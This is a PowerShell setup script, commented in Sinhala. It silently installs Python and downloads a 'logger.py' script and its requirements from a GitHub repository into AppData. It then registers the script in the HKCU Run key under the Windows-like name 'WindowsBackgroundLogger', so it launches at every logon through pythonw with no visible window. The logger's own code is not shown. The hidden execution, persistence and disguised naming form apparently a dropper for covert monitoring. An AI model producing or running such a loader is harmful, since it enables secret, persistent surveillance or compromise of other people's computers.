# 1. ෆයිල්ස් සුරක්ෂිතව තැන්පත් කිරීමට ෆෝල්ඩර් එකක් සෑදීම (AppData ඇතුළේ)
$installDir = "$env:LOCALAPPDATA\WindowsLogger"
if (!(Test-Path $installDir)) { 
    New-Item -ItemType Directory -Path $installDir -Force | Out-Null 
}

# ඔබ ලබාදුන් නව Public GitHub Raw Links
$loggerUrl = "https://raw.githubusercontent.com/Pathum-Official/logger/refs/heads/main/logger.py"
$reqUrl = "https://raw.githubusercontent.com/Pathum-Official/logger/refs/heads/main/requirements.txt"

Write-Host "=============================================" -ForegroundColor Cyan
Write-Host "   ස්වයංක්‍රීය Logger සැකසුම් ක්‍රියාවලිය   " -ForegroundColor Cyan
Write-Host "=============================================" -ForegroundColor Cyan

# 2. Python තිබේදැයි පරික්ෂා කිරීම සහ නොමැති නම් ඉන්ස්ටෝල් කිරීම
Write-Host "[*] Python පද්ධතිය පරීක්ෂා කරමින්..." -ForegroundColor Yellow
$pythonInstalled = $false

if (Get-Command python -ErrorAction SilentlyContinue) {
    $pythonVersion = & python --version
    Write-Host "[+] Python දැනටමත් ස්ථාපනය කර ඇත: $pythonVersion" -ForegroundColor Green
    $pythonInstalled = $true
}

if (-not $pythonInstalled) {
    Write-Host "[-] Python සොයාගත නොහැකි විය. Python 3.12.8 බාගත වෙමින් පවතී..." -ForegroundColor Orange
    $pythonUrl = "https://www.python.org/ftp/python/3.12.8/python-3.12.8-amd64.exe"
    $installerPath = "$env:TEMP\python_installer.exe"
    
    # Python Installer එක ඩවුන්ලෝඩ් කිරීම
    Invoke-WebRequest -Uri $pythonUrl -OutFile $installerPath
    
    Write-Host "[*] Python 3.12.8 පසුබිමෙන් ස්ථාපනය වෙමින් පවතී (Silent Installation)..." -ForegroundColor Yellow
    # නිශ්ශබ්දව සහ Path එකට එකතු වන ලෙස ඉන්ස්ටෝල් කිරීම
    $installArgs = "/quiet PrependPath=1 Include_test=0 Include_pip=1"
    $process = Start-Process -FilePath $installerPath -ArgumentList $installArgs -Wait -PassThru
    
    # Installer එක ඉවත් කිරීම
    Remove-Item $installerPath -Force
    
    # PowerShell Session එකේ Environment Paths Refresh කිරීම
    $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
    Write-Host "[+] Python සාර්ථකව ස්ථාපනය කරන ලදී!" -ForegroundColor Green
}

# 3. GitHub එකෙන් අවශ්‍ය ෆයිල්ස් ඩවුන්ලෝඩ් කිරීම
Write-Host "[*] ස්ක්‍රිප්ට් ගොනු බාගත වෙමින් පවතී..." -ForegroundColor Yellow
try {
    Invoke-WebRequest -Uri $loggerUrl -OutFile "$installDir\logger.py" -TimeoutSec 30
    Invoke-WebRequest -Uri $reqUrl -OutFile "$installDir\requirements.txt" -TimeoutSec 30
    Write-Host "[+] ගොනු සාර්ථකව බාගත කර AppData වෙත සුරැකිණි." -ForegroundColor Green
} catch {
    Write-Host "[-] ගොනු බාගත කිරීම අසාර්ථකයි! ලින්ක් එක නිවැරදිදැයි නැවත පරීක්ෂා කරන්න." -ForegroundColor Red
    Exit
}

# 4. Requirements.txt ඇතුළත් ලයිබ්‍රරි ඉන්ස්ටෝල් කිරීම
Write-Host "[*] අවශ්‍ය Python ලයිබ්‍රරි ස්ථාපනය වෙමින් පවතී..." -ForegroundColor Yellow
Set-Location $installDir

# Pip Update කිරීම සහ Requirements ඉන්ස්ටෝල් කිරීම
python -m pip install --upgrade pip --quiet
python -m pip install -r requirements.txt --quiet
Write-Host "[+] සියලුම ලයිබ්‍රරි සාර්ථකව ස්ථාපනය විය." -ForegroundColor Green

# 5. Windows Startup එකට එකතු කිරීම (පරිගණකය ක්‍රියාත්මක වන විට ස්වයංක්‍රීයව රන් වීමට)
Write-Host "[*] Windows Startup සැකසුම් ක්‍රියාත්මක වෙමින් පවතී..." -ForegroundColor Yellow

# pythonw.exe සොයා ගැනීම (කළු පාට prompt එකක් නැතිව run වීමට)
$pythonwPath = (Get-Command pythonw -ErrorAction SilentlyContinue).Source
if (-not $pythonwPath) {
    # Default Path එකක් ලෙස සලකා බැලීම
    $pythonwPath = "$env:USERPROFILE\AppData\Local\Programs\Python\Python312\pythonw.exe"
    if (!(Test-Path $pythonwPath)) {
        $pythonwPath = "pythonw" # Global Fallback
    }
}

$runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$shortcutCommand = "`"$pythonwPath`" `"$installDir\logger.py`""

# Registry එකට ඇතුළත් කිරීම
Set-ItemProperty -Path $runKey -Name "WindowsBackgroundLogger" -Value $shortcutCommand

Write-Host "=============================================" -ForegroundColor Green
Write-Host "[✓] සියල්ල සාර්ථකව අවසන් විය! Logger එක සක්‍රීයයි." -ForegroundColor Green
Write-Host "[i] ෆයිල්ස් පිහිටා ඇති ස්ථානය: $installDir" -ForegroundColor Cyan
Write-Host "=============================================" -ForegroundColor Green
